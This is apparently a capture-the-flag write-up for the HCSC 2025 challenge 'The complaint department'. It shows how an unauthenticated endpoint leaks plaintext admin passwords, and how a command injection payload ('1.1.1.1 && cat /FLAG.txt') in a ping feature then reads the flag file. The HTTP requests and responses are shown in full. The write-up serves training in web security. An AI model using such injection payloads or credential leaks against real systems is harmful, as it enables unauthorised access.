# HCSC 2025 - The complaint department

## Description

Hey, welcome to the company where you'll be handling the constant problems of every IT worker.
Sounds bad already? Just wait, the cybersecurity is non existent here, the boss Xavier basically clicks on everything he sees without thinking about it.
Best of luck to you and make sure to join the company server!

* VPN connection is required for this challenge
* Brute forcing is not required to complete the challenge
* Make sure to join the server without it you can't complete the challenge
* Submit request to the bot with the preprended `<shard_url>` which is an int `<1-9>`

`10.10.1-9.10:42069`

**Flag format**: `hcsc25{<Flag>}`

*By incarrnati0n*

## Metadata

- Filename: -
- Tags: `access control`, `command injection`
- Points: 350
- Number of solvers: 36

## Solution

If we load the website, we have two options: `login` and `register`.

![Main page](media/main-page.png)

Let's try registering first and than login.

It works.

Now we have a `Blog` and a `Ping` menu.

![After login](media/login.png)

If we navigate to the `Blog` menu, we can see an interesting request in the background.

![/requestUsers request](media/requestUsers.png)

```
GET /requestUsers HTTP/1.1
Host: 10.10.1.10:42069
[...]

```

```
HTTP/1.1 200 OK
Access-Control-Allow-Headers: authorization, Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers
Access-Control-Allow-Methods: OPTIONS, GET
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Tue, 29 Apr 2025 15:16:19 GMT
Content-Length: 6318

[{"uuid":"53b8d21a-5316-4ed4-802b-c35369e9e9ef","username":"Admin","password":"BigKekPepega","isAdmin":true},{"uuid":"3fd1fd3a-018f-4e84-9aff-9d6521f87542","username":"Xavier","password":"HolyGullible","isAdmin":true},{
[...]
```

Furthermore, it is unauthenticated (does not have any cookies or special headers).

We can try to log in using the `Admin` credentials and the `Xavier` credentials.

The `Ping` funcionality is only available for the `Xavier` user.

![Ping menu](media/ping.png)

Here we can try a basic (and classic) command injection to get the flag: `1.1.1.1 && cat /FLAG.txt`

![Command injection](media/flag.png)

```
POST /handleExecuteCommand HTTP/1.1
Host: 10.10.1.10:42069
Content-Length: 38
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiM2ZkMWZkM2EtMDE4Zi00ZTg0LTlhZmYtOWQ2NTIxZjg3NTQyIiwidXNlcm5hbWUiOiJYYXZpZXIiLCJpc0FkbWluIjp0cnVlLCJleHAiOjE3NDY4MDgxNzl9.IIDvaEOL1ZNlm6kqLlbzFNN-BJX7DH4pCNfbbZToB0o
[...]

{"command":"1.1.1.1 && cat /FLAG.txt"}
```

```
HTTP/1.1 200 OK
[...]
Content-Length: 269

PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: seq=0 ttl=42 time=4.682 ms

--- 1.1.1.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 4.682/4.682/4.682 ms
FLAG = hcsc25{H3y_BoRrow1ng_1s_n0t_Ste4l1ng}
```

The flag is: `hcsc25{H3y_BoRrow1ng_1s_n0t_Ste4l1ng}`

Based on the description (it suggest some XSS attack) and the communication on Discord, this was not the intended solution (it should have been an XSS challenge). The `/requestUsers` endpoint was unintentionally exposed, so this was a broken challenge.